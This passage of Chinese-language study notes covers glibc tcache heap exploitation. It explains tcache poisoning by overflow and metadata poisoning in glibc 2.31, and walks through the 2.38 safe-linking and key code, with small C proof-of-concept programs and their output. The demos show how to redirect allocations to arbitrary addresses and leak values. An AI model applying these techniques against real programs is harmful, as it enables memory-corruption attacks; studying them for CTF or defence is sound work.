<p>1.先后连续分配两个堆块<code>chunk1</code>,<code>chunk2</code>,使其地址物理上相邻,这样<code>chunk2</code>位于内存高处, <code>chunk1</code>可以从低处往高处溢出</p>
<p>2.释放<code>chunk2</code>使其返回到<code>tcache</code>中</p>
<p>3.从<code>chunk1</code>开始溢出,构造<code>chunk2</code>的假头,并修改<code>chunk2</code>的<code>next</code>指针指向一个希望的地址<code>target_addr</code></p>
<p>4.再分配一次,拿出<code>chunk2</code></p>
<p>5.再分配一次,拿出<code>target_addr</code></p>
<p>需要注意的是,<code>glibc2.31</code>中,判断<code>tcache</code>中是否还有堆块的依据是<code>counts[idx]</code>计数,而不是看指针是否为空</p>
<p>因此可以找炮灰堆块填线,滥竽充数一下把<code>counts</code>垫高</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015134751799.png" alt="image-20241015134751799"></p>
<p>假设<code>chunk1</code>和<code>chunk2</code>都是<code>malloc(0x20)</code>获取的堆块,那么站在<code>chunk1_mem</code>视角上</p>
<table>
<thead>
<tr>
<th>item</th>
<th>offset based on chunk1_mem</th>
<th>value</th>
</tr>
</thead>
<tbody><tr>
<td>chunk1_mem</td>
<td>0</td>
<td>pad</td>
</tr>
<tr>
<td></td>
<td>…</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_prev_size</td>
<td>+ 0x20</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_size</td>
<td>+ 0x28</td>
<td>0x31</td>
</tr>
<tr>
<td>chunk2_next</td>
<td>+ 0x30</td>
<td>target_addr</td>
</tr>
<tr>
<td>chunk2_key</td>
<td>+ 0x38</td>
<td>不变</td>
</tr>
</tbody></table>
<p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[] = <span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunkbait;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem_next;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line"></span><br><span class="line">    chunk1_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunkbait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">//炮灰</span></span><br><span class="line">    <span class="built_in">free</span>(chunkbait);</span><br><span class="line">    <span class="built_in">free</span>(chunk2_mem);</span><br><span class="line"></span><br><span class="line">    chunk2_mem_next = (<span class="type">char</span>*)chunk1_mem + <span class="number">0x30</span>;<span class="comment">//假设chunk1上overflow能覆盖chunk2 metadata</span></span><br><span class="line">    chunk2_mem_next[<span class="number">0</span>] = buffer;	<span class="comment">//buffer沾亲带故加入了tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(victim,<span class="string">&quot;flag&#123;bbbb&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# gcc test.c -o <span class="built_in">test</span> -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# ./test</span><br><span class="line">buffer now is flag&#123;aaaa&#125;</span><br><span class="line">buffer now is flag&#123;bbbb&#125;</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>



<h4 id="tcache-entry-poisoning导致tcache-metadata-poisoning"><a href="#tcache-entry-poisoning导致tcache-metadata-poisoning" class="headerlink" title="tcache entry poisoning导致tcache metadata poisoning"></a>tcache entry poisoning导致tcache metadata poisoning</h4><p>之前我们<code>tcache poisoning</code>都是这样考虑的:</p>
<p>1.malloc一个堆块</p>
<p>2.free该堆块进入tcache</p>
<p>3.UAF修改该堆块的next指针,指向目标地址</p>
<p>4.malloc拿出该堆块</p>
<p>5.malloc拿出目标地址假堆块</p>
<p>我们的目光局限在了堆块上,然而实际上对堆块的投毒,也会传染给元数据,并且还会传染给后续的堆块,考虑如下场景:</p>
<p>1.利用UAF将<code>fake_chunk</code>也加入到<code>tcache</code>中</p>
<p>这个<code>fake_chunk</code>的<code>next=0xcafebabe</code> 是一个任意值, 显然不是一个合法地址</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203432281.png" alt="image-20241015203432281"></p>
<p>2.一个<code>malloc</code>把<code>chunk1</code>拿出来,此时桶子头指向了<code>fake_chunk</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203623434.png" alt="image-20241015203623434"></p>
<p>3.再一个<code>malloc</code>把<code>fake_chunk</code>拿出来,那么桶子头会继承<code>fake_chunk.next</code></p>
<p>并且<code>tcache</code>中的堆块被重新分配时,其<code>key</code>会被置零,因此<code>fake_chunk_addr</code><strong>偏移8字节处的8个字节</strong>会被置零</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204025478.png" alt="image-20241015204025478"></p>
<p>4.此时<code>free</code>一个同样大小的堆块进入<code>tcache</code>,由于元数据已经被投毒,新堆块会继承桶子头的<code>next</code>指针,也就是<code>0xcafebabe</code></p>
<p>此时如果有<code>chunk2</code>的<code>UAF</code>就可以泄露<code>0xcafebabe</code>这个值</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204205909.png" alt="image-20241015204205909"></p>
<p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk_header[<span class="number">4</span>];</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk = (<span class="type">char</span>*)fake_chunk_header + <span class="number">0x10</span>; </span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0xcafebabe</span>;</span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;previous fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    fake_chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2.next = %p\n&quot;</span>, chunk2[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc metadata.c -o metadata -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./metadata</span><br><span class="line">previous fake_chunk.key = 0xdeadbeef</span><br><span class="line">now fake_chunk.key = (nil)</span><br><span class="line">chunk2.next = 0xcafebabe</span><br></pre></td></tr></table></figure>







<h3 id="glibc-2-38"><a href="#glibc-2-38" class="headerlink" title="glibc-2.38"></a>glibc-2.38</h3><p>数据结构与<code>glibc-2.31</code>相比,在数据结构上并无太大变化, 但是着重加固了<code>key</code>和<code>next</code>字段的计算算法, 目的是为了尽量缓解<code>double free</code></p>
<h4 id="datastructure-2"><a href="#datastructure-2" class="headerlink" title="datastructure"></a>datastructure</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p><code>key</code>不再是<code>tcache</code>基地址,而是一个随机数</p>
<p><code>next</code>不再是明文的下一个堆块地址,加了密了,盖了帽了</p>
<h4 id="algorithm-2"><a href="#algorithm-2" class="headerlink" title="algorithm"></a>algorithm</h4><h5 id="key-init"><a href="#key-init" class="headerlink" title="key init"></a>key init</h5><p>在<code>malloc.c</code>中有一个静态变量<code>tcache_key</code>, 每一个被放到<code>tcahce</code>中的堆块, 都会拷贝之作为自己的<code>key</code></p>
<p>与<code>glibc-2.31</code>上直接使用<code>tcache</code>地址作为<code>key</code>不同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br></pre></td></tr></table></figure>

<p>这个值会在第一次调用<code>malloc</code>时, 在整个堆初始化之前, 率先初始化, 包括<code>fopen</code>等操作间接调用的<code>malloc</code></p>
<p>整个初始化过程是这样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> @ <span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c</span><br><span class="line">	ptmalloc_init @ <span class="built_in">malloc</span>/arena.c</span><br><span class="line">		tcache_key_initialize</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__getrandom_nocancel(&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK) != <span class="keyword">sizeof</span>(tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">        tcache_key = random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">        tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给一个随机数作为<code>tcache_key</code>, 此后本进程执行期间不再更换<code>tcache_key</code>, 所有加入<code>tcache</code>的堆块都要拷贝该<code>key</code>值</p>
<h5 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	=&gt; tcache_get</span><br></pre></td></tr></table></figure>

<p><code>malloc</code>和之前的版本无太大区别</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ __libc_malloc</span></span><br><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//桶子下标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache != <span class="literal">NULL</span> &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;	</span><br><span class="line">    victim = tcache_get(tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable(victim);	<span class="comment">//作用不大</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span><span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span><span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e;</span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">        e = *ep;			<span class="comment">//正常tcache调用的tcache_get_n走此分支</span></span><br><span class="line">    <span class="keyword">else</span>				</span><br><span class="line">        e = REVEAL_PTR(*ep);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(e)))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">		<span class="comment">//#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0) 要求堆块基地址低三位全为0,注意是低三位位位</span></span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))		</span><br><span class="line">        *ep = REVEAL_PTR(e-&gt;next);			<span class="comment">//异或解码next指针, 正常tcache调用的tcache_get_n走此分支</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *ep = PROTECT_PTR(ep, REVEAL_PTR(e-&gt;next));</span><br><span class="line"></span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);		<span class="comment">//更新计数器</span></span><br><span class="line">    e-&gt;key = <span class="number">0</span>;						<span class="comment">//防止泄露key</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个<code>tcache_get_n</code>看上去十分诡异</p>
<p>在<code>tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</code>传参已经很明确了,为啥还要再判断一下呢?</p>
<p>这是因为再另一个函数<code>_mid_memalign</code>中会直接调用<code>tcache_get_n</code>并且这里获取的堆块不一定是桶子头,因此要根据拿走的堆块是头块还是后来块进行区分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_entry **tep = &amp; tcache-&gt;entries[tc_idx];</span><br><span class="line">tcache_entry *te = *tep;</span><br><span class="line"><span class="keyword">while</span> (te != <span class="literal">NULL</span> &amp;&amp; !PTR_IS_ALIGNED (te, alignment))</span><br><span class="line">  &#123;</span><br><span class="line">    tep = &amp; (te-&gt;next);</span><br><span class="line">    te = tcache_next (te);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (te != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *victim = tcache_get_n (tc_idx, tep);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>为什么会有头块和其他块的区别呢?</p>
<p>以为在<code>free</code>时, <code>tcache-&gt;entries[tc_idx]</code>桶子头指针不会被加密, 但是堆块的next指针会被加密</p>
<p>因此拿头块出来,不需要对 <code>tcache-&gt;entries[tc_idx]</code>指针解密</p>
<p>但是从中间扣一块出来需要解密</p>
</blockquote>
<p>简单来说<code>tcache_get_n</code>干了这三个事</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]</span><br><span class="line">e = *ep</span><br><span class="line"> *ep = REVEAL_PTR(e-&gt;next);</span><br></pre></td></tr></table></figure>

<p><code>ep</code>就是桶子头, </p>
<p><code>e</code>是头上挂着的第一个节点, 由于桶子头到第一个堆块的指针不加密, 因此可以直接解引用拿到头块</p>
<p>接下来要把次块作为新头块链接到桶子头上</p>
<p>但是头块到次块的指针是有加密的, 因此需要先<code>REVEAL_PTR(e-&gt;next);</code>解密 ,然后桶子头<code>ep</code>重新指向新头</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241010195555838.png" alt="image-20241010195555838"></p>
<p><code> *ep = REVEAL_PTR(e-&gt;next);</code>具体如何解密呢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"> *ep 	= REVEAL_PTR(e-&gt;next);</span><br><span class="line">    	= PROTECT_PTR (&amp;e-&gt;next, e-&gt;next)</span><br><span class="line">    	= ( (&amp;e-&gt;next) &gt;&gt;<span class="number">12</span> ) ^ (e-&gt;next)</span><br><span class="line">    	= ( this &gt;&gt; <span class="number">12</span> ) ^ ( next )</span><br></pre></td></tr></table></figure>

<p>就是当前堆块(数据区)地址右移<code>12</code>位然后和<code>next</code>块(数据区)地址做异或</p>
<h5 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	=&gt; _int_free</span><br><span class="line">		=&gt; tcache_put</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ _int_free</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">        tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">           trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">           2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">           coincidence before aborting.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache_key)) <span class="comment">// 防止double free</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            <span class="type">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">            LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">            <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">                 tmp;</span><br><span class="line">                 tmp = REVEAL_PTR(tmp-&gt;next), ++cnt) <span class="comment">// next指针不再直接指向下一个堆块, 有异或加密</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(tmp)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// tc_idx对应桶子中还有剩余堆块</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">       detect a double free.  */</span></span><br><span class="line">    e-&gt;key = tcache_key;		<span class="comment">//给一个key</span></span><br><span class="line"></span><br><span class="line">    e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);	<span class="comment">//next加密</span></span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;		<span class="comment">//头插法 ,注意这个指针是没有加密的</span></span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);			<span class="comment">//经验+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>next</code>如何计算的呢?</p>
<p>对于第一个入桶的堆块,此时<code>tcache-&gt;entries[tc_idx] = 0</code>,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">8</span> = (tcache_entry *) <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x405</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure>

